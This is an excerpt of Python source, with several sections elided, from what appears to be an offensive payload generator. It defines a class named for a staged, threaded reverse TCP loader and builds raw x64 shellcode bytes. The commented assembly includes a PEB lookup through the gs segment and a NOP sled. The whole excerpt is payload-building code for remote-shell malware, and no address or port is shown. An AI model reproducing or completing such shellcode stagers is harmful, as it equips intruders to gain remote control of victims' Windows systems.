...
class text_loader_reverse_tcp_staged_threaded():

    def __init__(self):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "text_loader_reverse_tcp_staged_threaded"
    ...
    def run(self):
        ...
        self.payload_stub += b"\x48\x31\xD2"           # xor rdx, rdx
        self.payload_stub += b"\x65\x48\x8B\x52\x60"   # mov rdx, QWORD ptr gs: [rdx+0x60]
        self.payload_stub += b"\x48\x8B\x52\x10"       # mov rdx, Qword ptr [rdx + 10]
        ...
        self.payload_stub += bytes("\x90\x90\x90\x90"
                            ...
                            , 'iso-8859-1')
        self.payload_stub += bytes("\x48\x31\xD2"                                  # xor rdx, rdx
